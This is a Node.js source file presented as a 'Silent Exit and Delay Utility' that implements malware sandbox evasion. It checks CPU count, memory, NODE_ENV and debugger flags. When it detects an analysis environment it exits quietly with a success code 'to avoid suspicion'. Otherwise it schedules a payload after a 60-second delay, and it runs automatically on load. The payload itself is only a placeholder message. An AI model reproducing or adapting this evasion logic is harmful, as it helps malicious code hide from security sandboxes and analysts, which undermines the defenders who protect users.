/**
 * Silent Exit and Delay Utility
 * Implements time-based evasion techniques
 */

const os = require('os');

// Configuration
const DELAY_BEFORE_EXIT_MS = 60000; // 60 seconds
const DELAY_BEFORE_EXECUTION_MS = 60000; // 60 seconds

/**
 * Silent exit - exits without error indication
 * Used to evade sandbox detection
 */
function silentExit() {
    console.log('Exiting silently...');
    // Clear console output
    console.log('\n\n\n');
    // Exit with success code (0) to avoid suspicion
    process.exit(0);
}

/**
 * Check if we should delay/exit based on environment
 * @returns {boolean} - True if should exit silently
 */
function shouldExitSilently() {
    // Check for common sandbox indicators
    
    // 1. Low CPU count
    const cpuCount = os.cpus().length;
    if (cpuCount < 2) {
        console.log('Sandbox indicator: Low CPU count');
        return true;
    }
    
    // 2. Low memory
    const totalMem = os.totalmem();
    if (totalMem < 2 * 1024 * 1024 * 1024) {
        console.log('Sandbox indicator: Low memory');
        return true;
    }
    
    // 3. Check for debug environment
    if (process.env.NODE_ENV === 'test' || process.env.NODE_ENV === 'development') {
        console.log('Sandbox indicator: Development environment');
        return true;
    }
    
    // 4. Check for inspection tools
    const hasDebugFlag = process.execArgv.some(arg => 
        arg.includes('inspect') || arg.includes('debug')
    );
    if (hasDebugFlag) {
        console.log('Sandbox indicator: Debug flag detected');
        return true;
    }
    
    return false;
}

/**
 * Execute with delay - waits before running payload
 * @param {Function} payload - Function to execute
 * @param {number} delay - Delay in milliseconds
 */
function executeWithDelay(payload, delay = DELAY_BEFORE_EXECUTION_MS) {
    console.log(`Scheduling payload execution in ${delay/1000} seconds...`);
    
    setTimeout(() => {
        console.log('Executing payload...');
        payload();
    }, delay);
}

/**
 * Delayed silent exit
 * Waits then exits without error
 */
function delayedSilentExit(delay = DELAY_BEFORE_EXIT_MS) {
    console.log(`Will exit silently in ${delay/1000} seconds...`);
    
    setTimeout(() => {
        silentExit();
    }, delay);
}

/**
 * Main evasion logic
 * @param {Function} payload - Payload to execute
 */
function runWithEvasion(payload) {
    if (shouldExitSilently()) {
        console.log('Sandbox detected, initiating silent exit sequence...');
        delayedSilentExit(DELAY_BEFORE_EXIT_MS);
    } else {
        console.log('Environment appears safe, scheduling payload...');
        executeWithDelay(payload, DELAY_BEFORE_EXECUTION_MS);
    }
}

/**
 * Sample payload for demonstration
 */
function samplePayload() {
    console.log('=== PAYLOAD EXECUTED ===');
    console.log('This is where malicious code would run');
    console.log('========================');
}

// Export functions
module.exports = {
    silentExit,
    shouldExitSilently,
    executeWithDelay,
    delayedSilentExit,
    runWithEvasion,
    samplePayload,
    DELAY_BEFORE_EXIT_MS,
    DELAY_BEFORE_EXECUTION_MS
};

// Auto-execute
console.log('=== Silent Exit & Delay Utility ===');
console.log('Environment:', process.env.NODE_ENV || 'production');
console.log('CPU Count:', os.cpus().length);
console.log('Memory:', (os.totalmem() / 1024 / 1024 / 1024).toFixed(2), 'GB');

runWithEvasion(samplePayload);
